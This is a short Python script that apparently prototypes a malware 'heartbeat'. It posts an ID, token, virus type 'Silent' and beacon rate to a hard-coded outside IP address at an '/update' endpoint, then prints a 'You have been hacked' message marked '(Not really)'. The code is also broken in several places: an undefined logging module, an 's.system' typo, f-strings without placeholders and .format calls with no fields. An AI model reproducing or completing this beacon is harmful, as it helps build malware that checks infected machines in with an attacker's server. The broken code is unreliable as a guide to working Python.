
import pkgutil
import requests
import tempfile
import os

# Read the cert data
cert_data = pkgutil.get_data('certifi', 'cacert.pem')

# Write the cert data to a temporary file
handle = tempfile.NamedTemporaryFile(delete=False)
handle.write(cert_data)
handle.flush()

# Set the temporary file name to an environment variable for the requests package
os.environ['REQUESTS_CA_BUNDLE'] = handle.name

def display_message(user_id, virus_type):
    os.system('echo You have been hacked by user: 1 with virus: Silent! (Not really) && pause'.format(user_id, virus_type))

def send_request(user_id, token, virus_type, name, heartbeat_rate):
    url = 'http://129.151.211.93:5000/update'
    data = {
        'user_id': '1',
        'token': '1234567890',
        'virus_type': 'Silent',
        'name': 'TestVirus1',
        'heartbeat_rate': '1h',
    }
    response = requests.post(url, json=data)
    logging.debug(f'Response status code: response.status_code')
    logging.debug(f'Response content: response.content')
    os.system('echo response.status_code , response.content && pause'.format(response.status_code, response.content))
    s.system('echo cmd testt && pause')

#os.system('echo Trying to send request)
send_request(user_id='1', token='1234567890', virus_type='Silent', name='TestVirus1', heartbeat_rate='1h')
#os.system('echo Displaying message)
display_message(user_id='1', virus_type='Silent')

# Clean up the temp file
os.remove(handle.name)
